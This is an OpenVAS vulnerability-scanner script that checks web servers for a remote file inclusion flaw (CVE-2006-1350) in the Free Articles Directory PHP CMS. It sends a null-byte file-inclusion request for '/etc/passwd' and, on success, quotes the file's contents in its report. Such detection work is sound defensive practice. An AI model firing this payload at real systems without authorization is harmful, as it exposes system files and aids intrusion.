# OpenVAS Vulnerability Test
# $Id: free_articles_directory_file_includes.nasl 9349 2018-04-06 07:02:25Z cfischer $
# Description: Free Articles Directory Remote File Inclusion Vulnerability
#
# Authors:
# Josh Zlatin-Amishav (josh at ramat dot cc)
#
# Copyright:
# Copyright (C) 2006 Josh Zlatin-Amishav
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote web server contains a PHP application that is affected by a
remote file include vulnerability. 

Description :

The remote host is running Free Articles Directory, a CMS written in
PHP. 

The installed version of Free Articles Directory fails to sanitize
user input to the 'page' parameter in index.php.  An unauthenticated
attacker may be able to read arbitrary local files or include a file
from a remote host that contains commands which will be executed by
the vulnerable script, subject to the privileges of the web server
process.";

tag_solution = "Unknown at this time.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.80060");
  script_version("$Revision: 9349 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:02:25 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2006-1350");
  script_bugtraq_id(17183);
  script_xref(name:"OSVDB", value:"24024");
  script_name("Free Articles Directory Remote File Inclusion Vulnerability");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2006 Josh Zlatin-Amishav");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/bugtraq/2006-03/0396.html");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

# The '/99articles' directory does not seem too popular, but it is the default installation directory
foreach dir( make_list_unique( "/99articles", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = string(dir, "/index.php?page=/etc/passwd%00");
  req = http_get( item:url, port:port );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) continue;
  
  # There's a problem if...
  if (
    # there's an entry for root or...
    (
      'Website Powered by <strong><a href="http://www.ArticlesOne.com">ArticlesOne.com' >< res &&
      egrep(pattern:"root:.*:0:[01]:", string:res) 
    ) ||
    # we get an error saying "failed to open stream" or "Failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing 
    #     remote URLs might still work.
    egrep(string:res, pattern:"Warning.+/etc/passwd.+failed to open stream") ||
    egrep(string:res, pattern:"Warning.+ Failed opening '/etc/passwd.+for inclusion")
  ) {
    if (egrep(pattern:"root:.*:0:[01]:", string:res)) {
      content = strstr(res, "<input type=image name=subscribe");
      if (content) content = strstr(content, 'style="padding-left:10">');
      if (content) content = content - 'style="padding-left:10">';
      if (content) content = content - strstr(content, "</td>");
    }

    if (content)
      report = string(
        "Here are the contents of the file '/etc/passwd' that\n",
        "It was possible to read from the remote host :\n",
        "\n",
        content
      );
    else report = "";

    security_message(port:port, data:report);
    exit(0);
  }
}

exit( 0 );